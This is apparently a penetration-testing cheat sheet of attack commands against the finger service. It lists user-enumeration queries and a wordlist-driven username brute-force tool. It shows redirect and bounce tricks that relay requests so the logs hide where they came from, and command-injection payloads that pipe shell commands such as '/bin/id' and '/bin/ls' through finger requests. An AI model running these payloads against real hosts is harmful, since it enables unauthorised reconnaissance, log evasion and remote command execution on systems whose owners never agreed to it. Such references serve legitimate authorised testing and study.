## User enumeration
```
finger @example.com
finger 'a b c d e f g h' @example.com
finger '1 2 3 4 5 6 7 8 9 0'@target_host
finger admin@example.com
finger user@example.com
finger 0@example.com
finger .@example.com
finger **@example.com
finger test@example.com
```

[http://pentestmonkey.net/tools/user-enumeration/finger-user-enum](http://pentestmonkey.net/tools/user-enumeration/finger-user-enum)
```
finger-user-enum.pl -U seclists/Usernames/Names/names.txt -t <ip>
```

## Finger Redirect

```
finger @target_host1@target_host2
```

## Command execution
```
finger "|/bin/id@example.com"
finger "|/bin/ls -a /@example.com"
```

## Finger Bounce

Hop from one finger deamon to another. Request will get logged as if it arrived from a relay.

```
finger@host.com@victim.com
```

## References

### Summarized References
- Giving the Finger to port 79 / Simple Finger Deamon Tutorial by Paris2K: http://cd.textfiles.com/hmatrix/Tutorials/hTut_0269.html
- http://0daysecurity.com/penetration-testing/enumeration.html
